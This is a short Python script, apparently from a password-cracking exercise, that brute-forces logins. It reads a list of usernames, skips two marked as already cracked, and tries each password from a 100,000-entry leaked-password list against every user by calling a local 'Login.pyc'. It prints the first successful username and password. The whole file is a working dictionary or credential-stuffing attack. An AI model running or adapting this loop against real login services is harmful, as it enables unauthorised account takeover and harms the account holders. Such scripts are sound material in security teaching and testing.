from datetime import datetime
import subprocess

def find():
    with open('gang', 'r', encoding='utf-8') as f:
        supervillans = [x.strip() for x in f]

    # Remove already-cracked users
    supervillans.remove('RiverOrangeTiger809')
    supervillans.remove('SkyRedFalcon914')

    with open('PwnedPWs100k', 'r', encoding='utf-8') as pwfile:
        for pw in pwfile:
            pw = pw.strip()

            for sv in supervillans:
                res = subprocess.run(
                    ["python3", "Login.pyc", sv, pw],
                    capture_output=True,
                    text=True
                )

                if "Login successful" in res.stdout:
                    print(sv, pw)
                    return   # STOP IMMEDIATELY

def main():
    print("Start:", datetime.now())
    find()
    print("End:", datetime.now())

if __name__ == "__main__":
    main()